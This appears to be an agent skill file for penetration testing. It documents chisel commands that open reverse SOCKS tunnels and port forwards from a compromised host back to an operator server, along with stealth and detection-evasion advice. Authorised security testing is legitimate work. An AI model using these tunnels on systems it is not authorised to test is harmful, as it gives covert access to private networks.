---
name: chisel
description: "Tunnel TCP, UDP and SOCKS5 traffic through a single HTTP/WebSocket stream with the chisel client/server pair. Use when a foothold can reach the internet but cannot accept inbound connections, or when you need a portable pivot with no root, no drivers and no libpcap. Not for kernel-routed pivots (use ligolo-ng) or for pushing existing tools through a proxy (use proxychains)."
---

# Chisel

Chisel is a single Go binary that carries a full SSH tunnel session inside an HTTP WebSocket. The client dials out to the server, so the compromised host needs no listening port, no root and no VPN adapter. Once up, it moves TCP forwards, UDP forwards and SOCKS5 in both directions.

Observed locally on this host: the client logs `Connecting to ws://host:port`, then `Handshaking`, then `tun: SSH connected`. The server prints a base64 fingerprint and logs every session with source address, user and requested remotes.

## When to use

| Goal | Direction | Remote spec |
| --- | --- | --- |
| Browse an internal network through your box | reverse SOCKS on the server | `R:socks` |
| Reach one internal service (RDP, SMB, HTTP) | reverse port forward | `R:13389:10.0.0.20:3389` |
| Expose a service the server can see onto the client | normal (local) forward | `8080:127.0.0.1:8080` |
| Share a pivot with a teammate | reverse SOCKS bound wide | `R:0.0.0.0:1081:socks` |
| DNS or other UDP through the tunnel | UDP forward | `R:5353:10.0.0.53:53/udp` |
| SOCKS that also carries UDP ASSOCIATE | udp socks | `R:1082:udpsocks` |
| SSH with no client-side listener | stdio | `stdio:%h:%p` via `ProxyCommand` |

Use ligolo-ng instead when you need real routing (`nmap -sS`, ICMP, tools with no proxy support). Use proxychains when traffic already exists and only needs a chain.

## Prerequisites

- Binaries: `/opt/tools/chisel` (v1.13.0) and `/opt/windows-tools/chisel.exe`. Same version on both ends; protocol changes between minor versions.
- Outbound TCP from the target to the server port, typically 443 or 8080, through any egress proxy that permits WebSocket upgrades.
- No privileges required on the target. The server side should be a host you control and can expose.
- For `R:...` remotes the server MUST run with `--reverse`. For `socks` remotes it MUST run with `--socks5`.

## Core invocations

```sh
# 1. Baseline server: reverse remotes, SOCKS, one credential, verbose
chisel server -p 8443 --reverse --socks5 --auth 'lab:labpass' -v

# 2. TLS server with your own certificate (client gets real chain validation)
chisel server -p 443 --tls-cert fullchain.pem --tls-key key.pem --reverse --socks5

# 3. Reverse SOCKS on the server: 127.0.0.1:1080 becomes a proxy into the target network
chisel client --auth lab:labpass https://10.10.14.5:443 R:socks

# 4. Reverse forward one service: server:13389 -> target-side 10.0.0.20:3389
chisel client https://10.10.14.5:443 R:13389:10.0.0.20:3389

# 5. Bind the reverse SOCKS wide so other hosts on your side can use it
chisel client https://10.10.14.5:443 R:0.0.0.0:1081:socks

# 6. Normal forward: server-side localhost:8080 appears on the client's localhost:8080
chisel client https://10.10.14.5:443 8080:127.0.0.1:8080

# 7. Pin the server key instead of trusting TLS alone (44-char base64 fingerprint)
chisel client --fingerprint 'jaOqrXMSBGAiUM+rlbWzh2Fv3sVuuneubOEMW0iAPFA=' http://10.10.14.5:8443 R:socks

# 8. Generate a stable key pair, then reuse it so the fingerprint never changes
chisel server --keygen /etc/chisel/server.key --keyfile /etc/chisel/server.key -p 8443 --reverse

# 9. Per-address authorization: this user may only open SOCKS and one RDP forward
cat > /etc/chisel/users.json <<'JSON'
{"lab:labpass": ["^socks$", "^127\\.0\\.0\\.1:13389$"]}
JSON
chisel server -p 8443 --reverse --socks5 --authfile /etc/chisel/users.json

# 10. Hide in plain sight: non-tunnel HTTP requests are proxied to a real site
chisel server -p 443 --backend http://127.0.0.1:8080 --reverse

# 11. Survive flaky egress: keepalive plus a bounded retry budget
chisel client --keepalive 20s --max-retry-count 20 --min-retry-interval 2s https://10.10.14.5:443 R:socks

# 12. UDP through the tunnel (DNS, syslog); UDP support is required on both peers
chisel client https://10.10.14.5:443 R:5353:10.0.0.53:53/udp

# 13. SSH over the tunnel when you cannot open a listener on the client
ssh -o ProxyCommand='chisel client https://10.10.14.5:443 stdio:%h:%p' user@10.0.0.20

# 14. Reach the server through a corporate HTTP/SOCKS proxy
chisel client --proxy http://user:pass@proxy.corp:8080 https://10.10.14.5:443 R:socks

# 15. Detach on a host with no supervisor; --pid leaves a pidfile to kill later
nohup chisel client https://10.10.14.5:443 R:socks --pid /tmp/.c.pid >/dev/null 2>&1 &
```

## Flags that matter

| Flag | Side | Effect |
| --- | --- | --- |
| `--reverse` | server | authorizes `R:` remotes; without it the client config is rejected |
| `--socks5` | server | enables the internal SOCKS5 proxy for `socks` remotes |
| `--auth` | both | single `<user>:<pass>`; client form authenticates, server form grants full access |
| `--authfile` | server | `users.json` mapping credentials to address regexes; reloaded on change, matches are unanchored unless you anchor them |
| `--fingerprint` | client | pins the server public key; strongly recommended over `--tls-skip-verify` |
| `--tls-cert` / `--tls-key` | server | serve HTTPS; both required, mutually exclusive with `--tls-domain` |
| `--tls-domain` | server | LetsEncrypt acquisition, forces port 443 |
| `--tls-skip-verify` | client | accept any TLS certificate; hides MITM, prefer fingerprint pinning |
| `--tls-ca` | both | custom CA bundle; on client `--tls-cert`/`--tls-key` add mTLS |
| `--backend` / `--proxy` | server | proxy non-tunnel HTTP requests to another server |
| `--keygen` / `--keyfile` | server | write and reuse a PEM key; `--key` is deprecated and ignored when `--keyfile` is set |
| `--keepalive` | both | idle keepalive, default `25s`; `0s` disables |
| `--max-retry-count` | client | retries before exit, `-1` (default) is unlimited |
| `--header` / `--hostname` / `--sni` | client | shape the outer HTTP request; `--hostname` rewrites Host, `--sni` rewrites TLS SNI |
| `--pid` | both | write a pidfile in the working directory |

## Workflow

1. **Pick the server host.** It must accept inbound TCP on one port. Everything else is outbound.
2. **Start the server with only what you need**: `--reverse` for any `R:` remote, `--socks5` for `socks`. Add `--auth` before the port is reachable from the internet.
3. **Record the fingerprint** from the server log and pass it to clients with `--fingerprint`.
4. **Deliver the client.** Over an existing shell, with `curl -o` from your own HTTP server, or `chisel.exe` on Windows.
5. **Request the smallest remote that solves the task.** One port forward leaves less in logs than a full SOCKS listener.
6. **Verify from the server side** before pointing tools at it (see Verification).
7. **Tear down** with SIGTERM to the pidfile: the process handles graceful shutdown, a second signal forces exit. On a host with systemd, the same client line belongs in a unit with `Restart=always`; that survives reboots but is far louder than a one-off `nohup`.

## OPSEC and telemetry

- One TCP connection per session. No inbound port on the target, so egress-only filtering and NAT are irrelevant; only the WebSocket upgrade has to be allowed.
- The outer layer is plain HTTP unless you configure TLS. With `--tls-cert` or `--tls-domain` the stream is HTTPS, and the inner SSH session is encrypted either way.
- The handshake is a plain WebSocket upgrade on `/`. Captured on this host: `GET / HTTP/1.1`, `User-Agent: Go-http-client/1.1`, `Connection: Upgrade`, `Upgrade: websocket`, `Sec-WebSocket-Protocol: chisel-v3`. That protocol tag is a precise IoC and is why both ends must match versions. The client has no User-Agent flag; only `--header` can add one, and the Go default string stays.
- TLS inspection breaks a self-signed server. Either import your CA on the client or use a real certificate on 443.
- The server log records session number, source address, user and every remote (`remotes=R:127.0.0.1:1080:socks`). On the target, process name, binary hash and the outbound connection are the artefacts.
- Both binaries are public and heavily signatured. Renaming helps against filename rules only; hashes and JA3-style fingerprints remain.
- Long-lived sessions are the loudest signal. Prefer short tunnels opened on demand over a permanent SOCKS listener.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| Session drops right after "Sending config" | `R:` remote without `--reverse` | add `--reverse` on the server |
| `socks` remote rejected | server missing `--socks5` | add `--socks5`, or use `R:5000:socks` |
| Client closes on the server key | pinned fingerprint does not match | re-read the fingerprint from the server log; treat a mismatch as hostile |
| `x509: certificate signed by unknown authority` | self-signed server, verifying client | `--fingerprint` (preferred) or `--tls-skip-verify` |
| Client reconnects in a loop | egress filter allows TCP but blocks WebSocket upgrade | try 443 with TLS, or `--proxy` through the allowed proxy |
| Connection dies every few minutes | idle timeout on NAT or proxy | lower `--keepalive` to `15s` |
| Server listens but no session appears | client cannot resolve or reach the host | test with `curl -k https://server:port/`; check `--hostname`/`--sni` |
| Every remote rejected for one user | `--authfile` regexes are unanchored and do not include `socks` | anchor with `^...$`, add an explicit `socks` entry |
| UDP remote silently fails | one peer lacks UDP support, or the bind failed | fall back to TCP remote; UDP ASSOCIATE needs both sides |

## Verification

```sh
chisel --version                                  # expect: 1.13.0
chisel server -p 18443 --reverse --socks5 &       # expect: Fingerprint ... and Listening on http://0.0.0.0:18443
chisel client http://127.0.0.1:18443 R:socks      # expect: tun: SSH connected
ss -lntp | grep 1080                              # expect: LISTEN on 127.0.0.1:1080
curl -s --socks5 127.0.0.1:1080 http://10.0.0.20/ -o /dev/null -w '%{http_code}\n'
# the server log names the effective bind: proxy#R:1081=>socks for a 0.0.0.0 remote,
# proxy#R:127.0.0.1:1082=>socks for a loopback-only one
```

Server-side log line to keep as evidence: `session#1: Open (user=lab addr=... remotes=R:127.0.0.1:1080:socks)` and the matching `Close` with duration.

## Related skills

- [ligolo-ng](../ligolo-ng/SKILL.md) when the pivot needs real routing instead of SOCKS
- [proxychains](../proxychains/SKILL.md) to drive tools through the SOCKS listener
- [nmap](../nmap/SKILL.md) for scanning through a forward once it is up
- [metasploit](../metasploit/SKILL.md) when the pivot should carry a session rather than raw sockets
- [toolchain-router](../toolchain-router/SKILL.md) to confirm chisel is the right pivot